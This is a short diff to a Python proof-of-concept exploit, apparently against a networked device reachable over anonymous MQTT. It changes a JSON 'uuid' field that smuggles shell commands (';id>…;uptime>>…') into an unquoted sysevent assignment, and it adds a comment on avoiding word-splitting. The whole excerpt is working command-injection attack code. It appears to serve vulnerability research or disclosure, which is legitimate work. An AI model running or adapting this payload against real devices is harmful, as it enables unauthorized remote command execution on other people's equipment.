@@ -100,8 +100,10 @@ def lua_exec(code):
 
 def main():
     host = os.environ.get("LN11_HOST", "192.168.1.1")
+    # No spaces in the uuid payload: the value passes through an unquoted
+    # sysevent assignment, so raw spaces would be word-split (see advisory).
     payload = json.dumps({"type": "status",
-                          "uuid": f"$(id;uptime >{MARK})",
+                          "uuid": f";id>{MARK};uptime>>{MARK}",
                           "data": {"pin": PIN}})
     rc, puback = mqtt_publish(host, TOPIC, payload)
     print(f"[1] anonymous MQTT -> CONNACK rc={rc}  PUBACK={puback}")
